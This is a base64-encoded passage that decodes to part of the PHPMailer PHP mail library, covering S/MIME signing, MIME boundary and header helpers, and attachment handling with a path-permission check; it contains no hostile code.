CAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vIEBUT0RPIHdvdWxkIGJlIG5pY2UgdG8gdXNlIHBocDovL3RlbXAgc3RyZWFtcyBoZXJlLCBidXQgbmVlZCB0byB3cmFwIGZvciBQSFAgPCA1LjENCiAgICAgICAgICAgICAgICAkZmlsZSA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnbWFpbCcpOw0KICAgICAgICAgICAgICAgIGlmIChmYWxzZSA9PT0gZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRib2R5KSkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzaWduaW5nJykgLiAnIENvdWxkIG5vdCB3cml0ZSB0ZW1wIGZpbGUnKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHNpZ25lZCA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnc2lnbmVkJyk7DQogICAgICAgICAgICAgICAgLy9Xb3JrYXJvdW5kIGZvciBQSFAgYnVnIGh0dHBzOi8vYnVncy5waHAubmV0L2J1Zy5waHA/aWQ9NjkxOTcNCiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oDQogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRzaWduZWQsDQogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUpLA0KICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkoJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzcyksDQogICAgICAgICAgICAgICAgICAgICAgICBudWxsDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKA0KICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUsDQogICAgICAgICAgICAgICAgICAgICAgICAkc2lnbmVkLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5KCdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2tleV9maWxlKSwgJHRoaXMtPnNpZ25fa2V5X3Bhc3MpLA0KICAgICAgICAgICAgICAgICAgICAgICAgbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgIFBLQ1M3X0RFVEFDSEVELA0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkc2lnbikgew0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSBmaWxlX2dldF9jb250ZW50cygkc2lnbmVkKTsNCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkc2lnbmVkKTsNCiAgICAgICAgICAgICAgICAgICAgLy9UaGUgbWVzc2FnZSByZXR1cm5lZCBieSBvcGVuc3NsIGNvbnRhaW5zIGJvdGggaGVhZGVycyBhbmQgYm9keSwgc28gbmVlZCB0byBzcGxpdCB0aGVtIHVwDQogICAgICAgICAgICAgICAgICAgICRwYXJ0cyA9IGV4cGxvZGUoIg0KDQoiLCAkYm9keSwgMik7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICRwYXJ0c1swXSAuICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSAkcGFydHNbMV07DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkZmlsZSk7DQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NpZ25pbmcnKSAuIG9wZW5zc2xfZXJyb3Jfc3RyaW5nKCkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAgICAgJGJvZHkgPSAnJzsNCiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRib2R5Ow0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFJldHVybiB0aGUgc3RhcnQgb2YgYSBtZXNzYWdlIGJvdW5kYXJ5Lg0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaGFyU2V0DQogICAgICogQHBhcmFtIHN0cmluZyAkY29udGVudFR5cGUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZw0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEJvdW5kYXJ5KCRib3VuZGFyeSwgJGNoYXJTZXQsICRjb250ZW50VHlwZSwgJGVuY29kaW5nKQ0KICAgIHsNCiAgICAgICAgJHJlc3VsdCA9ICcnOw0KICAgICAgICBpZiAoJGNoYXJTZXQgPT0gJycpIHsNCiAgICAgICAgICAgICRjaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjb250ZW50VHlwZSA9PSAnJykgew0KICAgICAgICAgICAgJGNvbnRlbnRUeXBlID0gJHRoaXMtPkNvbnRlbnRUeXBlOw0KICAgICAgICB9DQogICAgICAgIGlmICgkZW5jb2RpbmcgPT0gJycpIHsNCiAgICAgICAgICAgICRlbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJGJvdW5kYXJ5KTsNCiAgICAgICAgJHJlc3VsdCAuPSBzcHJpbnRmKCdDb250ZW50LVR5cGU6ICVzOyBjaGFyc2V0PSVzJywgJGNvbnRlbnRUeXBlLCAkY2hhclNldCk7DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOw0KICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkDQogICAgICAgIGlmICgkZW5jb2RpbmcgIT0gJzdiaXQnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJGVuY29kaW5nKTsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsNCg0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBSZXR1cm4gdGhlIGVuZCBvZiBhIG1lc3NhZ2UgYm91bmRhcnkuDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQ0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZEJvdW5kYXJ5KCRib3VuZGFyeSkNCiAgICB7DQogICAgICAgIHJldHVybiAkdGhpcy0+TEUgLiAnLS0nIC4gJGJvdW5kYXJ5IC4gJy0tJyAuICR0aGlzLT5MRTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTZXQgdGhlIG1lc3NhZ2UgdHlwZS4NCiAgICAgKiBQSFBNYWlsZXIgb25seSBzdXBwb3J0cyBzb21lIHByZXNldCBtZXNzYWdlIHR5cGVzLCBub3QgYXJiaXRyYXJ5IE1JTUUgc3RydWN0dXJlcy4NCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqIEByZXR1cm4gdm9pZA0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRNZXNzYWdlVHlwZSgpDQogICAgew0KICAgICAgICAkdHlwZSA9IGFycmF5KCk7DQogICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgew0KICAgICAgICAgICAgJHR5cGVbXSA9ICdhbHQnOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+aW5saW5lSW1hZ2VFeGlzdHMoKSkgew0KICAgICAgICAgICAgJHR5cGVbXSA9ICdpbmxpbmUnOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+YXR0YWNobWVudEV4aXN0cygpKSB7DQogICAgICAgICAgICAkdHlwZVtdID0gJ2F0dGFjaCc7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9IGltcGxvZGUoJ18nLCAkdHlwZSk7DQogICAgICAgIGlmICgkdGhpcy0+bWVzc2FnZV90eXBlID09ICcnKSB7DQogICAgICAgICAgICAvL1RoZSAncGxhaW4nIG1lc3NhZ2VfdHlwZSByZWZlcnMgdG8gdGhlIG1lc3NhZ2UgaGF2aW5nIGEgc2luZ2xlIGJvZHkgZWxlbWVudCwgbm90IHRoYXQgaXQgaXMgcGxhaW4tdGV4dA0KICAgICAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9ICdwbGFpbic7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBGb3JtYXQgYSBoZWFkZXIgbGluZS4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICR2YWx1ZQ0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGhlYWRlckxpbmUoJG5hbWUsICR2YWx1ZSkNCiAgICB7DQogICAgICAgIHJldHVybiAkbmFtZSAuICc6ICcgLiAkdmFsdWUgLiAkdGhpcy0+TEU7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogUmV0dXJuIGEgZm9ybWF0dGVkIG1haWwgbGluZS4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gdGV4dExpbmUoJHZhbHVlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICR2YWx1ZSAuICR0aGlzLT5MRTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgYW4gYXR0YWNobWVudCBmcm9tIGEgcGF0aCBvbiB0aGUgZmlsZXN5c3RlbS4NCiAgICAgKiBOZXZlciB1c2UgYSB1c2VyLXN1cHBsaWVkIHBhdGggdG8gYSBmaWxlIQ0KICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlIGZpbGUgY291bGQgbm90IGJlIGZvdW5kIG9yIHJlYWQuDQogICAgICogRXhwbGljaXRseSAqZG9lcyBub3QqIHN1cHBvcnQgcGFzc2luZyBVUkxzOyBQSFBNYWlsZXIgaXMgbm90IGFuIEhUVFAgY2xpZW50Lg0KICAgICAqIElmIHlvdSBuZWVkIHRvIGRvIHRoYXQsIGZldGNoIHRoZSByZXNvdXJjZSB5b3Vyc2VsZiBhbmQgcGFzcyBpdCBpbiB2aWEgYSBsb2NhbCBmaWxlIG9yIHN0cmluZy4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQuDQogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBGaWxlIGVuY29kaW5nIChzZWUgJEVuY29kaW5nKS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlIEZpbGUgZXh0ZW5zaW9uIChNSU1FKSB0eXBlLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQ0KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGFkZEF0dGFjaG1lbnQoJHBhdGgsICRuYW1lID0gJycsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICcnLCAkZGlzcG9zaXRpb24gPSAnYXR0YWNobWVudCcpDQogICAgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKCFzZWxmOjppc1Blcm1pdHRlZFBhdGgoJHBhdGgpIG9yICFAaXNfZmlsZSgkcGF0aCkpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgZmlsZSBuYW1lDQogICAgICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsNCiAgICAgICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOw0KICAgICAgICAgICAgaWYgKCRuYW1lID09ICcnKSB7DQogICAgICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAwID0+ICRwYXRoLA0KICAgICAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLA0KICAgICAgICAgICAgICAgIDIgPT4gJG5hbWUsDQogICAgICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsDQogICAgICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgICAgICA1ID0+IGZhbHNlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQNCiAgICAgICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgICAgICA3ID0+IDANCiAgICAgICAgICAgICk7DQoNCiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBSZXR1cm4gdGhlIGFycmF5IG9mIGF0dGFjaG1lbnRzLg0KICAgICAqIEByZXR1cm4gYXJyYXkNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QXR0YWNobWVudHMoKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hdHRhY2htZW50Ow0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEF0dGFjaCBhbGwgZmlsZSwgc3RyaW5nLCBhbmQgYmluYXJ5IGF0dGFjaG1lbnRzIHRvIHRoZSBtZXNzYWdlLg0KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbl90eXBlDQogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhdHRhY2hBbGwoJGRpc3Bvc2l0aW9uX3R5cGUsICRib3VuZGFyeSkNCiAgICB7DQogICAgICAgIC8vIFJldHVybiB0ZXh0IG9mIGJvZHkNCiAgICAgICAgJG1pbWUgPSBhcnJheSgpOw0KICAgICAgICAkY2lkVW5pcSA9IGFycmF5KCk7DQogICAgICAgICRpbmNsID0gYXJyYXkoKTsNCg0KICAgICAgICAvLyBBZGQgYWxsIGF0dGFjaG1lbnRzDQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7DQogICAgICAgICAgICAvLyBDaGVjayBpZiBpdCBpcyBhIHZhbGlkIGRpc3Bvc2l0aW9uX2ZpbHRlcg0KICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICRkaXNwb3NpdGlvbl90eXBlKSB7DQogICAgICAgICAgICAgICAgLy8gQ2hlY2sgZm9yIHN0cmluZyBhdHRhY2htZW50DQogICAgICAgICAgICAgICAgJHN0cmluZyA9ICcnOw0KICAgICAgICAgICAgICAgICRwYXRoID0gJyc7DQogICAgICAgICAgICAgICAgJGJTdHJpbmcgPSAkYXR0YWNobWVudFs1XTsNCiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsNCiAgICAgICAgICAgICAgICAgICAgJHN0cmluZyA9ICRhdHRhY2htZW50WzBdOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRwYXRoID0gJGF0dGFjaG1lbnRbMF07DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgJGluY2xoYXNoID0gbWQ1KHNlcmlhbGl6ZSgkYXR0YWNobWVudCkpOw0KICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkaW5jbGhhc2gsICRpbmNsKSkgew0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGluY2xbXSA9ICRpbmNsaGFzaDsNCiAgICAgICAgICAgICAgICAkbmFtZSA9ICRhdHRhY2htZW50WzJdOw0KICAgICAgICAgICAgICAgICRlbmNvZGluZyA9ICRhdHRhY2htZW50WzNdOw0KICAgICAgICAgICAgICAgICR0eXBlID0gJGF0dGFjaG1lbnRbNF07DQogICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uID0gJGF0dGFjaG1lbnRbNl07DQogICAgICAgICAgICAgICAgJGNpZCA9ICRhdHRhY2htZW50WzddOw0KICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScgJiYgYXJyYXlfa2V5X2V4aXN0cygkY2lkLCAkY2lkVW5pcSkpIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjaWRVbmlxWyRjaWRdID0gdHJ1ZTsNCg0KICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzJXMnLCAkYm91bmRhcnksICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgLy9Pbmx5IGluY2x1ZGUgYSBmaWxlbmFtZSBwcm9wZXJ0eSBpZiB3ZSBoYXZlIG9uZQ0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJG5hbWUpKSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKA0KICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZTogJXM7IG5hbWU9IiVzIiVzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICR0eXBlLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSksDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigNCiAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGU6ICVzJXMnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUsDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUNCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgLy8gUkZDMTM0MSBwYXJ0IDUgc2F5cyA3Yml0IGlzIGFzc3VtZWQgaWYgbm90IHNwZWNpZmllZA0KICAgICAgICAgICAgICAgIGlmICgkZW5jb2RpbmcgIT0gJzdiaXQnKSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlcyVzJywgJGVuY29kaW5nLCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtSUQ6IDwlcz4lcycsICRjaWQsICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgLy8gSWYgYSBmaWxlbmFtZSBjb250YWlucyBhbnkgb2YgdGhlc2UgY2hhcnMsIGl0IHNob3VsZCBiZSBxdW90ZWQsDQogICAgICAgICAgICAgICAgLy8gYnV0IG5vdCBvdGhlcndpc2U6IFJGQzIxODMgJiBSRkMyMDQ1IDUuMQ0KICAgICAgICAgICAgICAgIC8vIEZpeGVzIGEgd2FybmluZyBpbiBJRVRGJ3MgbXNnbGludCBNSU1FIGNoZWNrZXINCiAgICAgICAgICAgICAgICAvLyBBbGxvdyBmb3IgYnlwYXNzaW5nIHRoZSBDb250ZW50LURpc3Bvc2l0aW9uIGhlYWRlciB0b3RhbGx5DQogICAgICAgICAgICAgICAgaWYgKCEoZW1wdHkoJGRpc3Bvc2l0aW9uKSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpOw0KICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnL1sgXChcKTw+QCw7OlwiXC9cW1xdXD89XS8nLCAkZW5jb2RlZF9uYW1lKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzOyBmaWxlbmFtZT0iJXMiJXMnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRSAuICR0aGlzLT5MRQ0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGVuY29kZWRfbmFtZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzOyBmaWxlbmFtZT0lcyVzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUgLiAkdGhpcy0+TEUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzJXMnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRSAuICR0aGlzLT5MRQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIC8vIEVuY29kZSBhcyBzdHJpbmcgYXR0YWNobWVudA0KICAgICAgICAgICAgICAgIGlmICgkYlN0cmluZykgew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZVN0cmluZygkc3RyaW5nLCAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMtLSVzJywgJGJvdW5kYXJ5LCAkdGhpcy0+TEUpOw0KDQogICAgICAgIHJldHVybiBpbXBsb2RlKCcnLCAkbWltZSk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogRW5jb2RlIGEgZmlsZSBhdHRhY2htZW50IGluIHJlcXVlc3RlZCBmb3JtYXQuDQogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIFRoZSBmdWxsIHBhdGggdG8gdGhlIGZpbGUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBUaGUgZW5jb2RpbmcgdG8gdXNlOyBvbmUgb2YgJ2Jhc2U2NCcsICc3Yml0JywgJzhiaXQnLCAnYmluYXJ5JywgJ3F1b3RlZC1wcmludGFibGUnDQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24NCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuY29kZUZpbGUoJHBhdGgsICRlbmNvZGluZyA9ICdiYXNlNjQnKQ0KICAgIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCRwYXRoKSBvciAhZmlsZV9leGlzdHMoJHBhdGgpKSB7DQogICAgICAgICAgICAgICAgdGhyb